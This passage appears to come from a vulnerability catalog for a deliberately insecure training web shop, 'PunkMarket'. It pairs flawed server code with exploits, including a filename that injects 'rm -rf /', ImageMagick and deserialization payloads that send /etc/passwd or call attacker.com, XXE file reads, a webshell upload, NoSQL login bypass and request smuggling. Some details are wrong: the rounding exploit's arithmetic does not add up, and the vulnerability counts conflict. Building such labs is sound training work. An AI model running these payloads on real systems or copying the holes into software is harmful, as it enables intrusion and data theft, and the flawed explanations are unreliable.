  const promo = await db.query('SELECT * FROM promo_codes WHERE code = ?', [code]);
  
  if (!promo) {
    return res.status(404).json({error: 'Invalid promo code'});
  }
  
  if (promo.expires_at < new Date()) {
    return res.status(400).json({error: 'Promo code expired'});
  }
  
  // NO check for previous usage!
  const discount = promo.discount_percent;
  
  req.session.promoDiscount = discount;
  res.json({success: true, discount});
});
```

**Exploit:**
- Apply same promo code multiple times

---

### BL-02: Negative Price 🟢 Easy

**Код:**
```javascript
app.post('/api/v2/cart/add', authenticate, async (req, res) => {
  const {productId, quantity} = req.body;
  
  // No validation of quantity!
  const product = await db.getProduct(productId);
  const total = product.price * quantity;
  
  await db.query(
    'INSERT INTO cart_items (user_id, product_id, quantity, total) VALUES (?, ?, ?, ?)',
    [req.user.id, productId, quantity, total]
  );
  
  res.json({success: true, total});
});
```

**Exploit:**
```json
{
  "productId": 123,
  "quantity": -10
}
```

**Result:** Negative total → money credited!

---

### BL-03: Overselling (Buy More Than Stock) 🟡 Medium

**Код:**
```javascript
app.post('/api/v2/orders', authenticate, async (req, res) => {
  const {items} = req.body;
  
  for (const item of items) {
    const product = await db.getProduct(item.productId);
    
    // Check stock
    if (product.stock < item.quantity) {
      return res.status(400).json({error: 'Not enough stock'});
    }
  }
  
  // Decrement stock
  for (const item of items) {
    await db.query(
      'UPDATE products SET stock = stock - ? WHERE id = ?',
      [item.quantity, item.productId]
    );
  }
  
  // Create order
  await createOrder(req.user.id, items);
  res.json({success: true});
});
```

**Problem:**
- No transaction
- No row locking
- Race condition possible

**Exploit:**
- Send 10 parallel requests
- Buy 100 items when stock = 10

---

### BL-04: Self-Referral 🟡 Medium

**Код:**
```javascript
app.post('/api/v3/users/me/referral', authenticate, async (req, res) => {
  const {referralCode} = req.body;
  
  const referrer = await db.query(
    'SELECT * FROM users WHERE referral_code = ?',
    [referralCode]
  );
  
  if (!referrer) {
    return res.status(404).json({error: 'Invalid referral code'});
  }
  
  // NO check if referrer = self!
  await db.query('UPDATE users SET referred_by = ? WHERE id = ?', [referrer.id, req.user.id]);
  
  // Grant bonus
  await grantBonus(referrer.id, 10);
  
  res.json({success: true});
});
```

**Exploit:**
- Use own referral code
- Get bonus

---

### BL-05: Cancel After Shipping 🟡 Medium

**Код:**
```javascript
app.delete('/api/v2/orders/:id', authenticate, async (req, res) => {
  const orderId = req.params.id;
  
  const order = await db.getOrder(orderId);
  
  if (order.user_id !== req.user.id) {
    return res.status(403).json({error: 'Forbidden'});
  }
  
  // Missing: check order status!
  // Should not allow cancel if status = 'shipped'
  
  await db.query('UPDATE orders SET status = "cancelled" WHERE id = ?', [orderId]);
  await refundPayment(order.payment_id);
  
  res.json({success: true});
});
```

**Exploit:**
- Cancel order after shipping
- Get refund + keep product

---

### BL-06: Double Refund (Race Condition) 🔴 Hard

**Код:**
```javascript
app.post('/api/v2/orders/:id/refund', authenticate, async (req, res) => {
  const orderId = req.params.id;
  
  const order = await db.getOrder(orderId);
  
  if (order.user_id !== req.user.id) {
    return res.status(403).json({error: 'Forbidden'});
  }
  
  if (order.status === 'refunded') {
    return res.status(400).json({error: 'Already refunded'});
  }
  
  // Process refund (takes time)
  await processRefund(order.payment_id);
  
  // Update status (race window here!)
  await db.query('UPDATE orders SET status = "refunded" WHERE id = ?', [orderId]);
  
  res.json({success: true});
});
```

**Exploit:**
- Send 2 simultaneous refund requests
- Both pass status check
- Double refund!

---

### BL-07: Coupon Stacking 🔴 Hard

**Код:**
```javascript
app.post('/api/v2/orders/checkout', authenticate, async (req, res) => {
  const {items, coupons} = req.body;
  
  let total = calculateTotal(items);
  
  // Apply each coupon
  for (const couponCode of coupons) {
    const coupon = await db.getCoupon(couponCode);
    if (coupon && coupon.active) {
      total -= total * (coupon.discount / 100);
    }
  }
  
  // Missing: max number of coupons check!
  
  await createOrder(req.user.id, items, total);
  res.json({success: true, total});
});
```

**Exploit:**
```json
{
  "items": [...],
  "coupons": ["SAVE10", "SAVE20", "SAVE30", ...]
}
```

**Result:** Stack 100 coupons → free order!

---

### BL-08: Loyalty Points Integer Overflow 🔴 Hard

**Код:**
```javascript
app.post('/api/v3/users/me/points/add', authenticate, async (req, res) => {
  const {points} = req.body;
  
  // Add points from purchase
  await db.query(
    'UPDATE users SET loyalty_points = loyalty_points + ? WHERE id = ?',
    [points, req.user.id]
  );
  
  res.json({success: true});
});
```

**Database column:** INT (max 2,147,483,647)

**Exploit:**
- Add 2,147,483,647 points
- Integer overflow → negative balance → wraps to positive
- Infinite points

---

### BL-09: Payment Rounding Manipulation 🔴 Expert

**Код:**
```python
# Orders Service (Python)

def calculate_total(items):
    total = 0
    for item in items:
        # Price in cents
        price = item['price']
        quantity = item['quantity']
        total += price * quantity
    
    # Convert to dollars
    return round(total / 100, 2)

@app.post("/api/v2/orders")
async def create_order(items: List[Item]):
    total = calculate_total(items)
    
    # Charge customer
    charge_payment(total)
    
    # Store order
    create_order_record(items, total)
```

**Exploit:**
```json
{
  "items": [
    {"price": 0.001, "quantity": 1000}
  ]
}
```

**Calculation:**
```
0.001 * 1000 = 1
1 / 100 = 0.01
round(0.01, 2) = 0.01  (charged $0.01)

But items worth = $10.00
```

**Impact:** Pay $0.01, get $10 worth of products

---

### BL-10: Multi-Currency Rate Manipulation 🔴 Expert

**Код:**
```javascript
app.post('/api/v2/orders', authenticate, async (req, res) => {
  const {items, currency} = req.body;
  
  let total = calculateTotal(items); // in USD
  
  // Convert to user currency
  const rate = await getExchangeRate('USD', currency);
  total = total * rate;
  
  // Create order
  const order = await createOrder({
    user_id: req.user.id,
    items,
    total,
    currency
  });
  
  // Charge payment
  await chargePayment(order.id, total, currency);
  
  res.json({success: true, order});
});
```

**Problem:**
- Exchange rate can change between order creation and payment
- No rate locking

**Exploit:**
1. Create order when USD/RUB = 100
2. Wait for rate to drop to USD/RUB = 90
3. Complete payment
4. Profit: 10% discount

---

## File Upload

### UPLOAD-01: Avatar No Type Check 🟢 Easy

**Код:**
```javascript
const multer = require('multer');
const upload = multer({dest: '/uploads/'});

app.post('/api/v3/users/me/avatar', upload.single('file'), async (req, res) => {
  // NO type validation!
  const filename = req.file.filename;
  
  await db.query(
    'UPDATE users SET avatar = ? WHERE id = ?',
    [filename, req.user.id]
  );
  
  res.json({success: true, avatar: filename});
});

// Serve uploads
app.use('/uploads', express.static('/uploads'));
```

**Exploit:**
```bash
curl -X POST https://punkmarket.com/api/v3/users/me/avatar \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php"
```

**Then access:**
```
https://punkmarket.com/uploads/shell.php
```

**Impact:** RCE

---

### UPLOAD-02: Product Image Path Traversal 🟡 Medium

**Код:**
```javascript
app.post('/api/v2/admin/products/:id/image', requireAdmin, (req, res) => {
  const {filename} = req.body;
  const productId = req.params.id;
  
  // VULNERABLE: path traversal
  const filepath = `/var/www/products/${filename}`;
  
  fs.writeFileSync(filepath, req.file.buffer);
  
  await db.query('UPDATE products SET image = ? WHERE id = ?', [filename, productId]);
  res.json({success: true});
});
```

**Exploit:**
```json
{
  "filename": "../../../var/www/html/shell.php"
}
```

---

### UPLOAD-03: CSV Import Command Injection 🔴 Hard

**Код:**
```javascript
const { exec } = require('child_process');

app.post('/api/v2/admin/products/import', requireAdmin, upload.single('csv'), (req, res) => {
  const filepath = req.file.path;
  
  // Parse CSV using external tool
  exec(`csvtool extract 1,2,3 ${filepath}`, (err, stdout, stderr) => {
    if (err) {
      return res.status(500).json({error: err.message});
    }
    
    // Import products
    const lines = stdout.split('\n');
    for (const line of lines) {
      // Parse and insert into DB
    }
    
    res.json({success: true});
  });
});
```

**Exploit:**
```bash
# Upload CSV with malicious filename
curl -X POST /api/v2/admin/products/import \
  -F "csv=@test.csv; filename=\"; rm -rf / #.csv\""
```

**Result:**
```bash
csvtool extract 1,2,3 /tmp/; rm -rf / #.csv
```

**Impact:** RCE

---

### UPLOAD-04: PDF Generation XXE 🔴 Hard

**Код:**
```javascript
app.post('/api/v2/orders/:id/invoice', authenticate, async (req, res) => {
  const orderId = req.params.id;
  const order = await db.getOrder(orderId);
  
  // Generate invoice XML
  const xml = `
    <?xml version="1.0"?>
    <invoice>
      <order_id>${order.id}</order_id>
      <customer>${order.customer_name}</customer>
      <total>${order.total}</total>
    </invoice>
  `;
  
  // Convert XML to PDF using external library
  const pdf = await xmlToPdf(xml);
  
  res.contentType('application/pdf');
  res.send(pdf);
});
```

**Exploit:**
- Manipulate `customer_name` field:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<invoice>
  <customer>&xxe;</customer>
</invoice>
```

---

### UPLOAD-05: ImageMagick RCE 🔴 Expert

**Код:**
```javascript
const { exec } = require('child_process');

app.post('/api/v1/products/image/resize', upload.single('image'), (req, res) => {
  const inputPath = req.file.path;
  const outputPath = `/tmp/resized_${req.file.filename}`;
  
  // Use ImageMagick to resize
  exec(`convert ${inputPath} -resize 800x600 ${outputPath}`, async (err) => {
    if (err) {
      return res.status(500).json({error: 'Resize failed'});
    }
    
    res.sendFile(outputPath);
  });
});
```

**Exploit (ImageMagick CVE):**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl attacker.com -d @/etc/passwd")'
pop graphic-context
```

**Impact:** RCE via ImageMagick vulnerability

---

## XXE

### XXE-01: Review Submission (XML) 🟡 Medium

**Код:**
```javascript
const xml2js = require('xml2js');

app.post('/api/v1/reviews/xml', authenticate, async (req, res) => {
  const xmlBody = req.body;
  
  // Parse XML (vulnerable parser)
  xml2js.parseString(xmlBody, {}, (err, result) => {
    if (err) {
      return res.status(400).json({error: 'Invalid XML'});
    }
    
    const {product_id, rating, text} = result.review;
    
    await db.query(
      'INSERT INTO reviews (product_id, user_id, rating, text) VALUES (?, ?, ?, ?)',
      [product_id, req.user.id, rating, text]
    );
    
    res.json({success: true});
  });
});
```

**Exploit:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<review>
  <product_id>123</product_id>
  <rating>5</rating>
  <text>&xxe;</text>
</review>
```

---

### XXE-02: SOAP Legacy Endpoint 🔴 Hard

**Код:**
```javascript
const soap = require('soap');

app.post('/api/v1/legacy/soap', async (req, res) => {
  const xml = req.body;
  
  // Process SOAP request
  soap.parseString(xml, (err, result) => {
    // ...
  });
});
```

**Exploit:** XXE + Blind OOB

---

### XXE-03: PDF Generation XML 🔴 Hard

(See UPLOAD-04)

---

## Deserialization

### DESER-01: Session Cookie (Node.js) 🔴 Hard

**Код:**
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({
    // Vulnerable: serialize/deserialize user objects
    serializer: {
      parse: (data) => JSON.parse(data),  // Safe
      stringify: (data) => JSON.stringify(data)  // Safe
    }
  }),
  secret: 'secret123',
  resave: false,
  saveUninitialized: false
}));
```

**Problem:**
- If using `node-serialize` instead of JSON:

```javascript
const serialize = require('node-serialize');

// Vulnerable code
app.get('/api/v3/users/me', (req, res) => {
  const userData = serialize.unserialize(req.cookies.user);
  res.json(userData);
});
```

**Exploit:**
```javascript
// Malicious serialized object
const payload = serialize.serialize({
  rce: "_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker.com', function(error, stdout, stderr) { console.log(stdout) });}()"
});

// Set as cookie
```

---

### DESER-02: Redis Cache (Python) 🔴 Hard

**Код:**
```python
import pickle
import redis

redis_client = redis.Redis()

@app.get("/api/v2/products/{product_id}")
async def get_product(product_id: int):
    # Check cache
    cached = redis_client.get(f"product:{product_id}")
    if cached:
        # VULNERABLE: unpickle untrusted data
        return pickle.loads(cached)
    
    # Fetch from DB
    product = db.get_product(product_id)
    
    # Cache it
    redis_client.set(f"product:{product_id}", pickle.dumps(product))
    
    return product
```

**Exploit:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl attacker.com',))

payload = pickle.dumps(RCE())
redis_client.set("product:123", payload)
```

---

### DESER-03: Java Serialized Objects 🔴 Expert

**Код:**
```java
@PostMapping("/api/v1/products/import")
public ResponseEntity<?> importProducts(@RequestBody byte[] data) {
    try {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        List<Product> products = (List<Product>) ois.readObject();
        
        productRepository.saveAll(products);
        return ResponseEntity.ok("Imported");
    } catch (Exception e) {
        return ResponseEntity.status(500).body("Error");
    }
}
```

**Exploit:**
- Use `ysoserial` to generate payload
```bash
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com' | base64
```

---

## SSTI

### SSTI-01: Email Templates 🔴 Hard

**Код:**
```javascript
const Handlebars = require('handlebars');

async function sendOrderConfirmation(order) {
  // Load template
  const templateSource = await fs.readFile('/templates/order_confirmation.hbs', 'utf8');
  
  // Compile (VULNERABLE: user input in template)
  const template = Handlebars.compile(templateSource);
  
  // Render with user data
  const html = template({
    customerName: order.customer_name,
    orderId: order.id,
    total: order.total
  });
  
  await sendEmail(order.customer_email, 'Order Confirmation', html);
}
```

**Template:**
```handlebars
<h1>Hi {{customerName}}</h1>
<p>Your order #{{orderId}} confirmed.</p>
```

**Exploit:**
```json
POST /api/v2/orders
{
  "customer_name": "{{#each this}}{{@key}}={{this}}{{/each}}"
}
```

**Impact:** Info disclosure + potential RCE

---

### SSTI-02: Error Pages (Jinja2) 🔴 Expert

**Код:**
```python
from jinja2 import Template

@app.errorhandler(404)
def not_found(error):
    # VULNERABLE: render user input
    url = request.url
    template = Template(f"<h1>Page not found: {url}</h1>")
    return template.render(), 404
```

**Exploit:**
```
GET /{{7*7}}
→ Returns: <h1>Page not found: /49</h1>

GET /{{config}}
→ Leaks Flask config

GET /{{''.__class__.__mro__[1].__subclasses__()}}
→ RCE
```

---

## NoSQL Injection

### NOSQL-01: MongoDB Login 🟡 Medium

**Код:**
```javascript
app.post('/api/v3/auth/login', async (req, res) => {
  const {username, password} = req.body;
  
  // VULNERABLE: direct object injection
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  
  if (user) {
    const token = generateToken(user);
    res.json({token});
  } else {
    res.status(401).json({error: 'Invalid credentials'});
  }
});
```

**Exploit:**
```json
POST /api/v3/auth/login
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

**Result:** Login as first user (often admin)

---

### NOSQL-02: Orders Filter 🟡 Medium

**Код:**
```javascript
app.get('/api/v2/orders', authenticate, async (req, res) => {
  const {status, minTotal} = req.query;
  
  const query = {user_id: req.user.id};
  
  if (status) {
    query.status = status;
  }
  
  if (minTotal) {
    query.total = {$gte: minTotal};
  }
  
  const orders = await db.collection('orders').find(query).toArray();
  res.json(orders);
});
```

**Exploit:**
```
GET /api/v2/orders?status[$ne]=cancelled&minTotal[$gt]=0
```

---

### NOSQL-03: Elasticsearch Injection 🔴 Hard

**Код:**
```javascript
app.get('/api/v1/search', async (req, res) => {
  const {q} = req.query;
  
  // Build Elasticsearch query
  const body = {
    query: {
      query_string: {
        query: q  // VULNERABLE!
      }
    }
  };
  
  const result = await esClient.search({
    index: 'products',
    body
  });
  
  res.json(result.hits.hits);
});
```

**Exploit:**
```
GET /api/v1/search?q=*) OR (_exists_:secret_field
```

---

### NOSQL-04: MongoDB Aggregation Pipeline 🔴 Expert

**Код:**
```javascript
app.post('/api/v2/analytics', requireAdmin, async (req, res) => {
  const {pipeline} = req.body;
  
  // VULNERABLE: user-controlled aggregation
  const result = await db.collection('orders').aggregate(pipeline).toArray();
  
  res.json(result);
});
```

**Exploit:**
```json
POST /api/v2/analytics
{
  "pipeline": [
    {
      "$lookup": {
        "from": "users",
        "localField": "user_id",
        "foreignField": "_id",
        "as": "user"
      }
    },
    {
      "$project": {
        "user.password": 1
      }
    }
  ]
}
```

**Impact:** Arbitrary data access

---

## GraphQL

### GRAPHQL-01: Introspection Enabled 🟡 Medium

**Exploit:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Impact:** Schema disclosure

---

### GRAPHQL-02: Query Depth Limit Bypass 🟡 Medium

**Query:**
```graphql
{
  user(id: 1) {
    orders {
      items {
        product {
          reviews {
            user {
              orders {
                # ... deep nesting
              }
            }
          }
        }
      }
    }
  }
}
```

**Impact:** DoS

---

### GRAPHQL-03: Batching Attack 🔴 Hard

(See IDOR-08)

---

### GRAPHQL-04: Alias Abuse 🔴 Expert

**Query:**
```graphql
{
  a1: product(id: 1) { name price }
  a2: product(id: 2) { name price }
  # ... repeat 10000 times
}
```

**Impact:** DoS + data leakage

---

## Race Conditions

### RACE-01: Stock Decrement 🟡 Medium

(See BL-03)

---

### RACE-02: Double Refund 🔴 Hard

(See BL-06)

---

### RACE-03: Promo Code Concurrent Use 🔴 Hard

**Код:**
```javascript
app.post('/api/v2/orders/checkout', authenticate, async (req, res) => {
  const {promoCode} = req.body;
  
  if (promoCode) {
    const promo = await db.query('SELECT * FROM promo_codes WHERE code = ?', [promoCode]);
    
    if (promo.used_count >= promo.max_uses) {
      return res.status(400).json({error: 'Promo code exhausted'});
    }
    
    // Race window here!
    await sleep(100);
    
    // Increment usage
    await db.query('UPDATE promo_codes SET used_count = used_count + 1 WHERE code = ?', [promoCode]);
  }
  
  // Create order...
});
```

**Exploit:**
- Send N parallel requests
- All pass the check
- Use promo N times instead of once

---

### RACE-04: Concurrent Address Deletion 🔴 Hard

(See IDOR-06)

---

## Advanced

### ADV-01: Cache Poisoning (CDN Key) 🔴 Expert

**Код:**
```javascript
app.get('/api/v1/products/:id', (req, res) => {
  const {id} = req.params;
  const {locale} = req.query;
  
  // CDN caches based on URL only (no query params)
  const product = await db.getProduct(id);
  
  if (locale) {
    product.name = translate(product.name, locale);
  }
  
  res.set('Cache-Control', 'public, max-age=3600');
  res.json(product);
});
```

**Exploit:**
```
GET /api/v1/products/123?locale=<script>alert(1)</script>
```

**Result:**
- CDN caches response with XSS
- All users get poisoned cache

---

### ADV-02: Request Smuggling (CL.TE) 🔴 Expert

**Setup:**
- Frontend: nginx (uses Content-Length)
- Backend: Node.js (uses Transfer-Encoding)

**Request:**
```http
POST /api/v1/products/search HTTP/1.1
Host: punkmarket.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: punkmarket.com
```

**Result:**
- nginx sees 6-byte body, forwards
- Backend sees chunked, reads 0, starts new request
- Second request = `GET /admin` from "frontend"

---

### ADV-03: Prototype Pollution (Object.assign) 🔴 Expert

**Код:**
```javascript
app.put('/api/v3/users/me/settings', authenticate, async (req, res) => {
  const {settings} = req.body;
  
  // VULNERABLE: prototype pollution
  const userSettings = {};
  Object.assign(userSettings, settings);
  
  await db.query('UPDATE users SET settings = ? WHERE id = ?', [
    JSON.stringify(userSettings),
    req.user.id
  ]);
  
  res.json({success: true});
});
```

**Exploit:**
```json
PUT /api/v3/users/me/settings
{
  "settings": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

**Impact:**
- Pollute Object.prototype
- Bypass authorization checks

---

### ADV-04: Timing Attack on Admin Login 🔴 Expert

**Код:**
```javascript
app.post('/api/v2/admin/login', async (req, res) => {
  const {username, password} = req.body;
  
  const admin = await db.query('SELECT * FROM admins WHERE username = ?', [username]);
  
  if (!admin) {
    return res.status(401).json({error: 'Invalid credentials'});  // Fast
  }
  
  // Expensive password check
  const valid = await bcrypt.compare(password, admin.password_hash);  // Slow (100ms)
  
  if (!valid) {
    return res.status(401).json({error: 'Invalid credentials'});
  }
  
  const token = generateToken(admin);
  res.json({token});
});
```

**Exploit:**
- Measure response times
- Valid username → ~100ms (bcrypt)
- Invalid username → ~1ms (fast return)
- Enumerate valid usernames

---

### ADV-05: HTTP Parameter Pollution 🔴 Expert

**Код:**
```javascript
app.get('/api/v1/products', (req, res) => {
  const {category, sort} = req.query;
  
  // WAF checks first parameter
  // Backend uses last parameter
  
  let sql = `SELECT * FROM products WHERE category = '${category}'`;
  
  if (sort) {
    sql += ` ORDER BY ${sort}`;
  }
  
  db.query(sql, (err, results) => {
    res.json(results);
  });
});
```

**Exploit:**
```
GET /api/v1/products?category=electronics&category=1' UNION SELECT * FROM users--&sort=id
```

**Result:**
- WAF sees `category=electronics` (safe)
- Backend uses `category=1' UNION...` (SQLi)

---

## 📊 Summary

**Total vulnerabilities: 100+**

| Category | Count | Easy | Medium | Hard | Expert |
|----------|-------|------|--------|------|--------|
| SQL Injection | 7 | 2 | 2 | 2 | 1 |
| XSS | 10 | 3 | 4 | 2 | 1 |
| IDOR | 8 | 3 | 2 | 2 | 1 |
| CSRF | 5 | 2 | 1 | 1 | 1 |
| SSRF | 6 | 1 | 2 | 2 | 1 |
| Auth/Authz | 7 | 2 | 2 | 2 | 1 |
| Business Logic | 10 | 2 | 3 | 3 | 2 |
| File Upload | 5 | 1 | 1 | 2 | 1 |
| XXE | 3 | 0 | 1 | 2 | 0 |
| Deserialization | 3 | 0 | 0 | 2 | 1 |
| SSTI | 2 | 0 | 0 | 1 | 1 |
| NoSQL Injection | 4 | 0 | 2 | 1 | 1 |
| GraphQL | 4 | 0 | 2 | 1 | 1 |
| Race Conditions | 4 | 0 | 1 | 3 | 0 |
| Advanced | 5+ | 0 | 0 | 0 | 5+ |
| **TOTAL** | **83+** | **16** | **23** | **28** | **19+** |

---

**Version:** 1.0  
**Last Updated:** 2025-11-28  
**Status:** 🚧 Comprehensive vulnerability mapping completed
